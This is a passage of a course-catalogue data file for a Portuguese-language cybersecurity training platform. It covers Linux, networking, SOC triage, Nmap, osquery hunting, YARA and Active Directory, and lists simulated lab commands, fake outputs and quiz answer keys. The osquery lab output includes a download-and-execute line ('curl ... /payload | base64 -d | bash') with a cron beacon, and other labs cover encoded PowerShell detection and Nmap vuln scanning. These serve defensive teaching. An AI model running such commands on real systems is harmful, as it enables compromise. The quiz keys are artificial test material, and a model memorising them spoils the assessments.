    outcomes: ["Navegar o filesystem e gerenciar arquivos com segurança.", "Obter informações do sistema, rede e processos.", "Monitorar serviços, portas e eventos do journal.", "Administrar pacotes e reconhecer sinais de auditoria."],
    modules: [
      { title: "Navegação e arquivos", lessons: 4, description: "ls, ls -lah, pwd, cat e organização de diretórios no terminal." },
      { title: "Informações do sistema", lessons: 4, description: "uname -a, id, ip addr, ip route e configuração do ambiente." },
      { title: "Redes e conexões", lessons: 4, description: "ss -tulpn, sockets, portas abertas e configuração de rede." },
      { title: "Processos e serviços", lessons: 4, description: "ps aux, journalctl, ciclos de vida de processos e eventos." },
      { title: "Pacotes e administração", lessons: 4, description: "pacman -Q, inventário de pacotes e gestão do sistema." },
      { title: "Segurança e auditoria", lessons: 4, description: "Permissões, logs, sinais de auditoria e boas práticas." },
    ],
    labsList: [
      { title: "Navegação no filesystem", description: "Explore diretórios, liste arquivos e leia conteúdo com comandos básicos.", objective: "Navegar o filesystem e ler arquivos sem causar dano ao ambiente isolado.", command: "ls -lah && pwd && cat /etc/hostname", output: "/home/aluno\narquivo1.txt  arquivo2.txt\nlab-linux\nAluno-Curso-Linux" },
      { title: "Informações do sistema", description: "Obtenha kernel, usuário, grupos e configuração de rede do ambiente.", objective: "Identificar kernel, identidade e interfaces de rede do ambiente WASM.", command: "uname -a && id && ip addr show", output: "Linux v86 6.x Arch Linux\nuid=1000(aluno) gid=100(users)\n2: eth0: BROADCAST,MULTICAST,UP mtu 1500\n    inet 10.0.2.15/24 brd 10.0.2.255" },
      { title: "Monitoramento e auditoria", description: "Liste processos, portas abertas e eventos recentes do journal.", objective: "Correlacionar processos, serviços e eventos para identificar atividade anômala.", command: "ss -tulpn && ps aux --sort=-%cpu | head -5 && journalctl -n 5 --no-pager", output: "tcp LISTEN 0 128 0.0.0.0:22\nUSER PID %CPU CMD\nroot 1 0.0 /sbin/init\naluno 142 0.3 sshd: aluno@pts/0\njournal: systemd started\njournal: NetworkManager connected" },
    ],
    assessment: "Avaliação de navegação, sistema, redes, processos, pacotes e auditoria no terminal Linux.",
    assessmentQuestions: [
      { id: "linux-1", prompt: "O comando `ls -lah` exibe:", options: ["Todos os arquivos com detalhes e tamanhos legíveis", "Apenas diretórios vazios", "Somente permissões de root", "O conteúdo de um arquivo específico"], correctAnswer: 0, explanation: "ls -lah combina todos (-a), formato longo (-l) e tamanhos humanos (-h)." },
      { id: "linux-2", prompt: "O comando `ss -tulpn` serve para:", options: ["Listar sockets e portas abertas com processos", "Parar serviços em execução", "Apagar arquivos de log", "Alterar permissões de diretório"], correctAnswer: 0, explanation: "ss mostra sockets TCP (-t), UDP (-u), listening (-l), processos (-p) e numéricos (-n)." },
      { id: "linux-3", prompt: "O `journalctl -n 20` mostra:", options: ["As 20 últimas entradas do journal de eventos", "O histórico de comandos do usuário", "A tabela de rotas do kernel", "O conteúdo do /etc/passwd"], correctAnswer: 0, explanation: "journalctl consulta o systemd journal; -n limita o número de entradas exibidas." },
      { id: "linux-4", prompt: "A diferença entre throughput e goodput é:", options: ["Goodput exclui overhead e dados retransmitidos", "Não existe diferença prática", "Throughput é sempre maior que goodput por erro de medida", "Goodput mede latência, throughput mede largura de banda"], correctAnswer: 0, explanation: "Goodput é a taxa de dados úteis entregues à aplicação, removendo overhead de protocolo." },
      { id: "linux-5", prompt: "Em um ambiente WASM, comandos destrutivos afetam:", options: ["Apenas a máquina virtual isolada no navegador", "O sistema operacional real do aluno", "A rede local do usuário", "O servidor da plataforma"], correctAnswer: 0, explanation: "O ambiente WebAssembly roda isolado no navegador, sem acesso ao sistema real do aluno." },
      { id: "linux-6", prompt: "O comando `pacman -Q` é usado para:", options: ["Listar pacotes instalados no Arch Linux", "Buscar pacotes em repositórios remotos", "Atualizar o kernel manualmente", "Remover pacotes órfãos sem confirmação"], correctAnswer: 0, explanation: "pacman -Q lista o banco local de pacotes instalados; -Qs busca e -Qe lista explicitamente instalados." },
    ],
  },
  {
    slug: "redes-zero-avancado", code: "NET-02", title: "Redes de Computadores — Do Zero ao Avançado", shortTitle: "Redes", level: "Iniciante", duration: "24 horas", lessons: 20, labs: 3, quizCount: 6, accent: "cyan", icon: "network",
    description: "20 capítulos de densidade universitária: do sinal físico e protocolos até cloud, segurança e troubleshooting. Fundamentos, teoria do sinal, enlace, IP, roteamento, transporte e arquitetura.", focus: "Construir visão progressiva de conectividade, protocolos e diagnóstico em redes modernas.",
    outcomes: ["Explicar métricas de rede: largura de banda, throughput, goodput, latência, jitter e perda.", "Compreender modelos OSI e TCP/IP, encapsulamento e PDUs por camada.", "Analisar teoremas de Nyquist e Shannon para dimensionamento de canais.", "Aplicar fundamentos de IP, roteamento, transporte e segurança em cenários práticos."],
    modules: [
      { title: "Fundamentos da comunicação", lessons: 4, description: "Informação, representação, métricas essenciais e sistemas de comunicação." },
      { title: "Camadas e encapsulamento", lessons: 4, description: "Modelos OSI e TCP/IP, serviços, interfaces e PDUs." },
      { title: "Camada física e enlace", lessons: 4, description: "Nyquist, Shannon, meios, CRC e janelas deslizantes." },
      { title: "IP, roteamento e endereçamento", lessons: 4, description: "IPv4/IPv6, subnets, protocolos de rota e NAT." },
      { title: "Transporte e aplicações", lessons: 4, description: "TCP, UDP, modelos de atraso e serviços de aplicação." },
      { title: "Segurança, wireless e cloud", lessons: 4, description: "Firewalls, VLANs, WAN, cloud e arquitetura de disponibilidade." },
    ],
    labsList: [
      { title: "Análise de métricas de rede", description: "Meça latência, jitter e perda em um cenário simulado.", objective: "Interpretar métricas reais para diagnosticar degradação de serviço.", command: "ping -c 4 10.0.0.1 && mtr --report 10.0.0.1", output: "PING 10.0.0.1: 4 packets, 0% loss, avg 12ms\nHost  Loss% Snt Last Avg Best Wrst\n10.0.0.1 0.0% 4 11.2 12.1 10.8 14.3" },
      { title: "Endereçamento IP e subnets", description: "Calcule subnets, máscaras e intervalos úteis para uma rede corporativa.", objective: "Planejar endereçamento IP com máscara adequada e evitar sobreposição.", command: "ipcalc 192.168.10.0/24 && ipcalc 10.10.0.0/16", output: "Network: 192.168.10.0/24\nBroadcast: 192.168.10.255\nHostMin: 192.168.10.1\nHostMax: 192.168.10.254" },
      { title: "Troubleshooting com ferramentas CLI", description: "Use ping, traceroute, nslookup e ss para diagnosticar conectividade.", objective: "Identificar falhas de rota, DNS e conectividade em um cenário simulado.", command: "traceroute -m 5 8.8.8.8 && nslookup exemplo.com", output: "1 10.0.0.1 2ms\n2 200.100.0.1 8ms\n3 8.8.8.8 12ms\nName: exemplo.com\nAddress: 93.184.216.34" },
    ],
    assessment: "Avaliação de métricas, camadas, meios, IP, roteamento, transporte e troubleshooting.",
    assessmentQuestions: [
      { id: "redes-1", prompt: "A diferença entre largura de banda e throughput é:", options: ["Largura de banda é nominal; throughput é a taxa real observada", "Não existe diferença prática", "Throughput é sempre maior que largura de banda", "Largura de banda mede latência"], correctAnswer: 0, explanation: "Largura de banda define o teto teórico; throughput é o que se observa em uso real." },
      { id: "redes-2", prompt: "O teorema de Shannon estabelece:", options: ["Capacidade máxima de um canal com ruído: C = B·log₂(1+S/N)", "Que qualquer canal pode ser ilimitado com codificação", "Que ruído não afeta canais digitais", "Que fibras ópticas são imunes a qualquer limite"], correctAnswer: 0, explanation: "Shannon-Hartley define o limite absoluto de transmissão confiável em canal com ruído." },
      { id: "redes-3", prompt: "O encapsulamento em redes significa:", options: ["Cada camada adiciona cabeçalho ao tratar dados da camada superior", "Dados são criptografados em todas as camadas", "Pacotes são comprimidos antes de enviar", "A camada física gera o conteúdo da aplicação"], correctAnswer: 0, explanation: "Encapsulamento adiciona cabeçalho (e às vezes trailer) em cada camada para tratamento opaco." },
      { id: "redes-4", prompt: "O modelo TCP/IP possui:", options: ["4 camadas: Aplicação, Transporte, Internet e Link", "7 camadas iguais ao OSI", "3 camadas simplificadas", "5 camadas com sessão separada"], correctAnswer: 0, explanation: "TCP/IP agrupa apresentação e sessão na camada de Aplicação, resultando em 4 camadas." },
      { id: "redes-5", prompt: "A codificação Manchester é usada porque:", options: ["Oferece recuperação de clock excelente com transição no centro de cada bit", "É a mais rápida de todas as codificações", "Não requer sincronização alguma", "Permite transmitir 4 bits por símbolo sem DSP"], correctAnswer: 0, explanation: "Manchester garante transição a cada bit, facilitando a recuperação de clock no receptor." },
      { id: "redes-6", prompt: "Em troubleshooting, a ordem correta geralmente é:", options: ["Físico → enlace → rede → transporte → aplicação", "Aplicação → transporte → rede → enlace → físico", "Aleatória dependendo do humor do analista", "Apenas camada de aplicação"], correctAnswer: 0, explanation: "Abordagem bottom-up garante que camadas inferiores estejam saudáveis antes de subir." },
    ],
  },
  {
    slug: "soc-n1-pratico", code: "SOC-N1", title: "SOC N1 — Prática em Ambiente Fictício", shortTitle: "SOC N1", level: "Iniciante", duration: "16 horas", lessons: 14, labs: 3, quizCount: 6, accent: "cyan", icon: "shield",
    description: "Formação prática para analistas iniciantes em empresa fictícia: SIEM barulhento, EDR dramático, VPN com login estranho, usuário clicando em e-mail bonito e gestor perguntando se é grave mesmo.", focus: "Operar como analista N1 em um SOC fictício realista com mão na massa, ITIL e classificação de severidade.",
    outcomes: ["Classificar severidade de alertas com critério técnico e contexto de negócio.", "Investigar eventos de VPN, e-mail e endpoint com evidências reais.", "Documentar tickets para escalonamento ao N2 com informações completas.", "Aplicar princípios ITIL no fluxo de incidentes de segurança."],
    modules: [
      { title: "O que é SOC e por que existe", lessons: 4, description: "Função do SOC, pessoas, processos e tecnologia para reduzir impacto de incidentes." },
      { title: "ITIL e fluxo de tickets", lessons: 4, description: "Classificação, severidade, escalonamento e documentação adequada." },
      { title: "SIEM, EDR e telemetria", lessons: 4, description: "Alertas, triagem, playbooks e ferramentas de detecção." },
      { title: "Investigação e resposta", lessons: 4, description: "VPN suspeita, e-mail phishing, endpoint comprometido e contenção." },
      { title: "Relatórios para N2 e negócio", lessons: 4, description: "Evidências, linha do tempo, impacto e comunicação para escalonamento." },
      { title: "Caso final integrado", lessons: 4, description: "Incidente completo desde o alerta até a contenção e lições aprendidas." },
    ],
    labsList: [
      { title: "Triagem de alerta no SIEM", description: "Classifique um alerta de login anômalo em um SIEM simulado.", objective: "Avaliar severidade, contexto e próximos passos para um evento de autenticação.", command: "siem query --event login --user mari.soc --source 200.100.0.55", output: "Eventos encontrados: 3\nHorários: 02:14, 02:15, 02:16\nGeolocalização: País X (não habitual)\nSeveridade sugerida: Alta — login fora do padrão" },
      { title: "Análise de VPN suspeita", description: "Investigue uma sessão VPN com credenciais comprometidas.", objective: "Correlacionar sessão VPN com atividade anômala e determinar escopo de impacto.", command: "vpn sessions --user carlos.fin --last 24h && siem correlate --user carlos.fin --window 1h", output: "Sessão VPN: 10.50.0.12 → 10.10.5.20 (DB)\nDuração: 47 min\nAções: SELECT em tabela de clientes (3x)\nCorrelação: 2 alertas EDR no mesmo período" },
      { title: "Ticket para escalonamento", description: "Documente um incidente para passagem ao N2 com evidências completas.", objective: "Produzir ticket com fato, evidência, impacto e próximos passos para N2 e auditoria.", command: "ticket create --type incident --severity high --evidence vpn-session-4471", output: "Ticket: INC-2026-0891\nTipo: Incidente de segurança\nSeveridade: Alta\nEvidências: 3 anexadas\nStatus: Escalonado para N2" },
    ],
    assessment: "Avaliação de triagem, classificação, investigação, escalonamento e documentação em SOC N1.",
    assessmentQuestions: [
      { id: "socn1-1", prompt: "Um alerta de login fora do horário comercial deve ser:", options: ["Analisado com contexto: geolocalização, dispositivo e comportamento histórico", "Ignorado porque é comum", "Escalonado imediatamente sem análise", "Classificado como falso positivo automático"], correctAnswer: 0, explanation: "Contexto adicional determina se o alerta é legítimo, anômalo ou falso positivo." },
      { id: "socn1-2", prompt: "O papel do N1 em um SOC inclui:", options: ["Triagem inicial, classificação e escalonamento com evidências", "Decidir sozinho sobre contenção de servidores críticos", "Ignorar alertas para focar em projetos", "Alterar configurações de firewall sem aprovação"], correctAnswer: 0, explanation: "N1 faz a primeira linha de triagem e prepara informação qualificada para níveis superiores." },
      { id: "socn1-3", prompt: "Um ticket para N2 deve conter:", options: ["Fato, evidência, impacto e próximos passos propostos", "Apenas a conclusão do analista", "Opinião pessoal sem dados", "Senha do usuário afetado"], correctAnswer: 0, explanation: "Tickets bem documentados permitem que N2 e auditoria entendam o contexto sem retrabalho." },
      { id: "socn1-4", prompt: "ITIL no contexto de SOC ajuda a:", options: ["Organizar fluxo de incidentes com papéis, processos e SLAs", "Eliminar a necessidade de ferramentas de segurança", "Substituir a análise técnica por burocracia", "Garantir que todos os alertas são reais"], correctAnswer: 0, explanation: "ITIL fornece estrutura para gestão de serviços, incluindo incidentes e mudanças." },
      { id: "socn1-5", prompt: "Quando um alerta do EDR indica processo suspeito em endpoint:", options: ["Verificar processo, parentesco, cmdline e contexto antes de conter", "Desligar o endpoint imediatamente sem investigação", "Ignorar porque EDR gera muitos falsos positivos", "Reinstalar o sistema operacional"], correctAnswer: 0, explanation: "Investigação contextual evita contenção prematura e preserva evidências forenses." },
      { id: "socn1-6", prompt: "A classificação de severidade deve considerar:", options: ["Impacto, urgência, escopo e evidências disponíveis", "Apenas o horário do alerta", "A opinião do gestor sem dados", "O número de alertas no dia"], correctAnswer: 0, explanation: "Severidade combina múltiplos fatores para priorizar resposta de forma proporcional." },
    ],
  },
  {
    slug: "nmap-sem-mentira", code: "NMAP-01", title: "Nmap Sem Mentira — Do Zero ao Avançado", shortTitle: "Nmap", level: "Intermediário", duration: "6 horas", lessons: 12, labs: 3, quizCount: 6, accent: "purple", icon: "terminal",
    description: "12 capítulos com laboratório obrigatório em CLI: fundamentos, sintaxe, estados de porta, host discovery, TCP/UDP scanning, NSE, evasão, timing, saídas e cenários finais.", focus: "Aprender Nmap entendendo rede, pacote, resposta, limitação, evidência e decisão técnica.",
    outcomes: ["Explicar como Nmap infere comportamento de rede a partir de sondas e respostas.", "Distinguir estados de porta: aberta, fechada, filtrada e unfiltered.", "Aplicar técnicas de descoberta de hosts e enumeração de serviços.", "Usar scripts NSE de forma responsável em escopo autorizado."],
    modules: [
      { title: "Fundamentos: o que o Nmap realmente faz", lessons: 2, description: "Sondas, respostas, inferência e a diferença entre evidência e conclusão." },
      { title: "Sintaxe, alvos e escopo autorizado", lessons: 2, description: "Escopo, alvos simulados e limites éticos de varredura." },
      { title: "Estados de porta e leitura de firewall", lessons: 2, description: "Aberta, fechada, filtrada, unfiltered e o que cada estado revela." },
      { title: "Host discovery e TCP scanning", lessons: 2, description: "-sn, -sS, -sT e técnicas de descoberta de hosts ativos." },
      { title: "UDP, SCTP e protocolos esquecidos", lessons: 2, description: "Varreduras UDP, SCTP e interpretação de silêncio como resposta." },
      { title: "NSE, evasão, timing e saídas", lessons: 2, description: "Scripts NSE, -T, -f, -D e formatação de saída para relatório." },
    ],
    labsList: [
      { title: "Descoberta de hosts", description: "Identifique hosts ativos em uma rede simulada autorizada.", objective: "Usar host discovery para mapear dispositivos ativos sem varredura invasiva.", command: "nmap -sn 10.10.10.0/24", output: "Starting Nmap 7.94\nHost is up (0.00032s latency).\nNmap scan report for 10.10.10.10\nNmap scan report for 10.10.10.20\nNmap scan report for 10.10.10.30\nNmap done: 256 IP addresses (3 hosts up)" },
      { title: "Enumeração de serviços", description: "Identifique serviços, versões e sistema operacional em alvos simulados.", objective: "Obter fingerprinting de serviço e OS com varredura versionada em escopo autorizado.", command: "nmap -sV -O 10.10.10.10", output: "PORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH 9.2\n80/tcp open http nginx 1.24.0\n443/tcp open https nginx 1.24.0\nOS: Linux 5.x-6.x" },
      { title: "Scripts NSE", description: "Execute scripts de vulnerabilidade em alvos de treinamento.", objective: "Aplicar scripts NSE para detectar vulnerabilidades conhecidas em ambiente controlado.", command: "nmap --script vuln 10.10.10.20", output: "PORT STATE SERVICE\n80/tcp open http\n|_http-vuln-cve2021-44228: VULNERABLE\n|_http-enum: /admin/: Potentially interesting folder\nNmap done: 1 host scanned" },
    ],
    assessment: "Avaliação de fundamentos, estados de porta, scanning, NSE, evasão e interpretação de resultados.",
    assessmentQuestions: [
      { id: "nmap-1", prompt: "Quando Nmap recebe RST em resposta a SYN, isso indica:", options: ["Host alcançável com porta fechada", "Porta aberta com serviço ativo", "Firewall bloqueando todas as conexões", "Host inexistente na rede"], correctAnswer: 0, explanation: "RST indica que o host respondeu mas a porta não está aceitando conexões." },
      { id: "nmap-2", prompt: "A varredura SYN (-sS) é considerada 'stealth' porque:", options: ["Não completa o handshake TCP, apenas envia SYN e observa resposta", "Usa pacotes criptografados", "Não aparece em logs de firewall", "Só funciona em redes locais"], correctAnswer: 0, explanation: "SYN scan não estabelece conexão completa, apenas envia SYN e interpreta SYN/ACK ou RST." },
      { id: "nmap-3", prompt: "Quando Nmap não recebe resposta a uma sonda UDP:", options: ["Pode ser porta aberta, filtrada ou host inexistente — exige contexto adicional", "A porta está definitivamente fechada", "O host está comprometido", "A varredura falhou e deve ser repetida"], correctAnswer: 0, explanation: "UDP não responde quando porta está aberta; silêncio é ambíguo e exige inferência contextual." },
      { id: "nmap-4", prompt: "O parâmetro -T4 no Nmap controla:", options: ["Timing e performance da varredura (agressivo)", "O tipo de protocolo a ser usado", "A criptografia da varredura", "O número de portas a verificar"], correctAnswer: 0, explanation: "Timing templates (-T0 a -T5) controlam velocidade e agressividade da varredura." },
      { id: "nmap-5", prompt: "Scripts NSE são usados para:", options: ["Estender funcionalidades: detecção de vulnerabilidades, brute force, enumeração", "Substituir o motor de varredura do Nmap", "Criptografar os resultados da varredura", "Desabilitar o firewall do alvo"], correctAnswer: 0, explanation: "NSE (Nmap Scripting Engine) permite scripts Lua para tarefas específicas de enumeração e detecção." },
      { id: "nmap-6", prompt: "Varredura em ativos sem autorização é:", options: ["Ilegal na maioria das jurisdições e antiética", "Aceitável se o resultado for negativo", "Permitida para fins educacionais sem restrições", "Legal se usarTiming agressivo"], correctAnswer: 0, explanation: "Varredura não autorizada pode configurar acesso não autorizado; sempre obtenha permissão explícita." },
    ],
  },
  {
    slug: "osquery-floresta", code: "OSQ-01", title: "OSQuery na Floresta — Endpoint Hunting", shortTitle: "OSQuery", level: "Intermediário", duration: "12 horas", lessons: 12, labs: 3, quizCount: 6, accent: "green", icon: "shield",
    description: "12 módulos de hunting em endpoints com SQL: processos suspeitos, rede, persistência, hash, serviços, packs, SOC, base64/LOL e DFIR em cenário fictício CyberDimension Corp.", focus: "Investigar endpoints com SQL usando osquery para detecção, hunting e resposta a incidentes.",
    outcomes: ["Consultar telemetria de endpoint com SQL: processos, rede, cron, hash e serviços.", "Identificar processos suspeitos por cmdline, caminho e parentesco.", "Detectar persistência via tarefas agendadas e serviços anômalos.", "Correlacionar evidências de endpoint para triagem de incidentes."],
    modules: [
      { title: "O que é osquery?", lessons: 2, description: "Endpoint telemetry com SQL, osqueryi vs osqueryd e casos de uso." },
      { title: "SQL do zero", lessons: 2, description: "SELECT, FROM, WHERE, LIKE, LIMIT, JOIN e ORDER BY aplicados ao endpoint." },
      { title: "Hunting de processos", lessons: 2, description: "Processos em caminhos estranhos, cmdline suspeita e parentesco." },
      { title: "Rede e conexões", lessons: 2, description: "Processo falando com IP externo, listening e conexões estabelecidas." },
      { title: "Persistência e FIM", lessons: 2, description: "Cron, tasks agendadas, hash de integridade e mudanças de arquivo." },
      { title: "SOC e DFIR", lessons: 2, description: "osquery + SIEM, packs operacionais, triagem de incidente e caso final." },
    ],
    labsList: [
      { title: "Inventário do endpoint", description: "Obtenha hostname, CPU, memória e processos em execução com SQL.", objective: "Criar contexto inicial do ativo antes de qualquer hipótese de incidente.", command: "SELECT hostname, cpu_brand, physical_memory FROM system_info; SELECT pid, name, path FROM processes LIMIT 10;", output: "hostname: vovo-srv-2009\ncpu_brand: Intel Xeon E5-2680 v4\nphysical_memory: 8589934592\npid: 142, name: sshd, path: /usr/sbin/sshd" },
      { title: "Caça a processos suspeitos", description: "Identifique processos em caminhos não padrão com cmdline anômala.", objective: "Detectar execução em /tmp, /dev/shm ou com argumentos codificados em base64.", command: "SELECT pid, name, path, cmdline FROM processes WHERE path LIKE '/tmp%' OR cmdline LIKE '%base64%';", output: "pid: 8841, name: curl, path: /tmp/.wolf/update.sh\ncmdline: curl -s http://10.10.10.99/payload | base64 -d | bash\npid: 8842, name: python3, path: /tmp/.wolf/beacon.py" },
      { title: "Persistência e beacon externo", description: "Investigue tarefas agendadas e conexões externas de processos suspeitos.", objective: "Correlacionar persistência (cron) com atividade de rede para confirmar comprometimento.", command: "SELECT command, minute, hour FROM crontab; SELECT p.name, s.remote_address, s.remote_port FROM processes p JOIN socket_events s ON p.pid = s.pid WHERE s.remote_address NOT LIKE '10.%';", output: "crontab: */5 * * * * /tmp/.wolf/beacon.py\nsocket: python3 → 200.100.0.99:443 (ESTABLISHED)\nsocket: curl → 10.10.10.99:8080 (SYN_SENT)\nConclusão: beacon ativo com persistência via cron" },
    ],
    assessment: "Avaliação de telemetria SQL, hunting, persistência, rede e triagem DFIR com osquery.",
    assessmentQuestions: [
      { id: "osq-1", prompt: "O osquery transforma o sistema operacional em:", options: ["Tabelas consultáveis com SQL para telemetria de endpoint", "Um banco de dados relacional permanente", "Um SIEM completo com dashboard", "Um antivírus baseado em regras"], correctAnswer: 0, explanation: "osquery expõe recursos do SO como tabelas SQL: processos, usuários, portas, configurações." },
      { id: "osq-2", prompt: "Um processo em /tmp com cmdline contendo base64 é suspeito porque:", options: ["Processos legítimos raramente executam de /tmp ou decodificam base64 em pipeline", "Isso é comportamento padrão de qualquer aplicação", "Indica que o processo é confiável", "Não é possível determinar suspeição por cmdline"], correctAnswer: 0, explanation: "Combinação de localização temporária + decodificação sugere payload dinâmico." },
      { id: "osq-3", prompt: "A tabela crontab no osquery mostra:", options: ["Tarefas agendadas que podem indicar persistência de malware", "O histórico de comandos do usuário", "As conexões de rede ativas", "Os hashes de todos os arquivos do sistema"], correctAnswer: 0, explanation: "crontab lista tarefas agendadas; malware moderno usa agendamento para persistência." },
      { id: "osq-4", prompt: "O JOIN entre processes e socket_events permite:", options: ["Correlacionar qual processo está se comunicando com qual endereço", "Listar todos os usuários do sistema", "Verificar integridade de arquivos", "Monitorar uso de CPU em tempo real"], correctAnswer: 0, explanation: "JOIN por pid conecta processo à sua atividade de rede para investigação contextual." },
      { id: "osq-5", prompt: "FIM (File Integrity Monitoring) com osquery usa:", options: ["Hash de arquivos para detectar mudanças não autorizadas", "Criptografia de disco completo", "Backup automático de arquivos", "Compressão de logs antigos"], correctAnswer: 0, explanation: "FIM compara hashes atuais com baseline para detectar alterações em arquivos críticos." },
      { id: "osq-6", prompt: "Um pack no osquery é:", options: ["Conjunto organizado de queries para operação contínua e padronizada", "Um pacote de instalação do osquery", "Um filtro de rede para bloquear tráfego", "Um template de dashboard para SIEM"], correctAnswer: 0, explanation: "Packs agrupam queries relacionadas para execução programada e operação consistente." },
    ],
  },
  {
    slug: "yara-na-veia", code: "YARA-01", title: "YARA na Veia — Caçando Padrão sem Caçar Fantasma", shortTitle: "YARA", level: "Intermediário", duration: "35 horas", lessons: 8, labs: 3, quizCount: 6, accent: "green", icon: "shield",
    description: "Curso prático para SOC, DFIR e Threat Hunting: strings, hex, condições, governança, hunting em diretórios, tuning e desafio final com amostras inofensivas e evidências controladas.", focus: "Escrever, executar e interpretar regras YARA com hipóteses de detecção fundamentadas.",
    outcomes: ["Escrever regras YARA com strings, hex patterns e condições booleanas.", "Distinguir detecção de padrão de sentença final de malware.", "Aplicar metadata, tags e governança para regras operacionais.", "Tunar regras para reduzir falsos positivos em ambientes reais."],
    modules: [
      { title: "O que é YARA e o que ele não é", lessons: 1, description: "Linguagem de regras para padrões, origem VirusTotal e limites de detecção." },
      { title: "Strings e modificadores", lessons: 1, description: "ASCII, wide, nocase, regex e o problema do falso positivo." },
      { title: "Hex patterns", lessons: 1, description: "Sequências hexadecimais, wildcards e quando texto não basta." },
      { title: "Condições e governança", lessons: 1, description: "any of them, all of them, metadata, tags e versionamento." },
      { title: "Hunting e tuning", lessons: 2, description: "Hunting em diretórios, leitura de evidências e ajuste fino de regras." },
      { title: "Desafio final", lessons: 2, description: "Incidente sem glamour: regra, evidência, contexto e relatório." },
    ],
    labsList: [
      { title: "Match básico com strings", description: "Execute uma regra YARA contra amostras inofensivas em filesystem virtual.", objective: "Entender match como sinal de padrão compatível, não sentença final.", command: "yara rules/intro.yar samples/dropper.txt", output: "intro_suspicious samples/dropper.txt\nMatch: $ps (powershell -enc)\nContexto: regra indica comportamento suspeito, não malware confirmado" },
      { title: "Hex patterns e condições", description: "Escreva regra com sequência hexadecimal e condição específica.", objective: "Criar regra mais precisa que reduz falsos positivos com hex + condição.", command: "yara rules/hex_rule.yar samples/pe_like.bin", output: "hex_detector samples/pe_like.bin\nMatch: $mz (4D 5A) + $suspect (6A 40 68)\nCondition: $mz at 0 and $suspect\nConfiança: média — requer análise adicional" },
      { title: "Tuning para reduzir falsos positivos", description: "Ajuste uma regra que detecta conteúdo legítimo (falso positivo).", objective: "Refinar condição para excluir contexto legítimo mantendo detecção de padrão suspeito.", command: "yara rules/tuned_rule.yar samples/noisy_admin_script.ps1", output: "Antes do tuning: 5 matches (3 falsos positivos)\nDepois do tuning: 2 matches (0 falsos positivos)\nRegra ajustada: condição + contexto de execução e metadata" },
    ],
    assessment: "Avaliação de regras YARA, strings, hex, condições, governança e tuning para detecção.",
    assessmentQuestions: [
      { id: "yara-1", prompt: "YARA é uma linguagem de regras usada para:", options: ["Identificar padrões em artefatos digitais com strings, hex e condições", "Executar malware em sandbox automaticamente", "Bloquear tráfego de rede em tempo real", "Gerar relatórios de compliance para auditoria"], correctAnswer: 0, explanation: "YARA descreve hipóteses de detecção baseadas em padrões persistentes em arquivos." },
      { id: "yara-2", prompt: "Uma regra com string isolada 'password' é fraca porque:", options: ["Mistura contextos legítimos e gera baixa precisão operacional", "YARA não suporta strings ASCII", "A string precisa ser sempre hexadecimal", "O arquivo precisa ter extensão .exe"], correctAnswer: 0, explanation: "Strings genéricas produzem muitos falsos positivos; contexto e combinação melhoram precisão." },
      { id: "yara-3", prompt: "O modificador 'nocase' em uma string YARA significa:", options: ["A string é encontrada independentemente de maiúsculas ou minúsculas", "A string é ignorada na condição", "A string só funciona em arquivos binários", "A string é convertida para hexadecimal"], correctAnswer: 0, explanation: "nocase torna o match case-insensitive, útil para padrões que variam em capitalização." },
      { id: "yara-4", prompt: "A condição 'any of them' em uma regra YARA significa:", options: ["A regra dá match se qualquer uma das strings for encontrada", "Todas as strings precisam estar presentes", "Nenhuma string pode estar presente", "A regra ignora todas as strings"], correctAnswer: 0, explanation: "any of them é menos restritiva; all of them exige que todas as strings sejam encontradas." },
      { id: "yara-5", prompt: "Metadata e tags em regras YARA servem para:", options: ["Organizar, versionar e contextualizar regras para operação em equipe", "Acelerar a execução da varredura", "Criptografar o conteúdo da regra", "Impedir modificação da regra por terceiros"], correctAnswer: 0, explanation: "Metadata e tags permitem governança, filtragem e rastreabilidade de regras em produção." },
      { id: "yara-6", prompt: "Tuning de regra YARA busca:", options: ["Reduzir falsos positivos mantendo detecção de padrão suspeito", "Aumentar o número de matches a qualquer custo", "Eliminar todas as strings da regra", "Tornar a regra mais genérica possível"], correctAnswer: 0, explanation: "Tuning equilibra sensibilidade e precisão para operação confiável em SOC e DFIR." },
    ],
  },
  {
    slug: "identidade-quebrada", code: "IAM-02", title: "Identidade Quebrada — IAM, AD, Kerberos e Detecção", shortTitle: "Identidade Quebrada", level: "Intermediário", duration: "12 horas", lessons: 6, labs: 3, quizCount: 6, accent: "cyan", icon: "shield",
    description: "Active Directory, Kerberos, NTLM, privilégios, cloud identity, OAuth, MFA, logs e detecção em ambiente fictício CyberDimension Corp. Ninguém acha suspeito só porque o dashboard piscou — aqui você prova.", focus: "Entender como identidades viram caminho de ataque e como detectar com evidências.",
    outcomes: ["Enumerar AD: SID, grupos, tokens e privilégios de usuário.", "Entender Kerberos: TGT, TGS, KDC, SPN e ataques associados.", "Identificar riscos de NTLM: hash, relay e lateralização.", "Detectar abuso de identidade com correlação SIEM e resposta a incidente."],
    modules: [
      { title: "O Registro Civil do Domínio", lessons: 1, description: "AD básico, SID, grupos, token e quem é quem no domínio." },
      { title: "Kerberos: o Balcão dos Tickets", lessons: 1, description: "TGT, TGS, KDC, SPN e o fluxo de autenticação Kerberos." },
      { title: "NTLM e o Porão Legado", lessons: 1, description: "Hash NTLM, relay attacks e lateralização de movimento." },
      { title: "Privilégios: o Carimbo que Destrói", lessons: 1, description: "ACL, delegation, admin paths e BloodHound para mapeamento." },
      { title: "Cloud Identity e OAuth", lessons: 1, description: "SSO, MFA, tokens, consent grants e riscos de nuvem." },
      { title: "SOC de Identidade", lessons: 1, description: "Correlação, resposta, contenção e julgamento sem achismo." },
    ],
    labsList: [
      { title: "Enumeração AD", description: "Liste identidade, grupos e privilégios de um usuário no domínio fictício.", objective: "Entender token de acesso, SID e membership de grupos para análise de privilégio.", command: "whoami /all && net user mari.soc /domain", output: "USER INFORMATION\nUser Name: mari.soc\nSID: S-1-5-21-1234567890-1234567890-1234567890-1105\nGroup: Domain Users, SOC Analysts\nPrivileges: SeBatchLogonRight" },
      { title: "Kerberos e NTLM", description: "Investigue tickets Kerberos e eventos de autenticação NTLM no SIEM.", objective: "Correlacionar klist com eventos SIEM para identificar autenticação anômala.", command: "klist && siem search event_id=4624 logon_type=3", output: "Cached Tickets: 3\nTGT: krbtgt/CYBERDIM.LOCAL\nService: MSSQLSvc/db01.cyberdim.local\nSIEM: Event 4624 (logon type 3) — 14 occurrences from 200.100.0.55" },
